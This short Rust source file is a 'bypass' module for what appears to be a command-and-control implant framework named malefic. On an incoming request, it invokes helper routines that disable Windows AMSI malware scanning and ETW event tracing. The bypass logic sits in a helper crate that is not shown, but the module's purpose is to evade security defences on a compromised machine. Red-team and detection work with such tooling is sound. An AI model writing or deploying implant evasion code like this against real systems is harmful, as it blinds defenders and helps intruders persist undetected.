use crate::{check_request, Module, Result, TaskResult};
use malefic_proto::proto::implantpb::spite::Body;
use async_trait::async_trait;
use malefic_trait::module_impl;

pub struct Bypass {}

#[async_trait]
#[module_impl("bypass")]
impl Module for Bypass {
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, _sender: &mut crate::Output) -> Result {
        let req = check_request!(receiver, Body::BypassRequest)?;
        unsafe {
            if req.amsi {
                malefic_helper::win::kit::bypass::bypass_amsi();
            }
            if req.etw {
                malefic_helper::win::kit::bypass::bypass_etw();
            }
        }

        Ok(TaskResult::new(id))
    }
}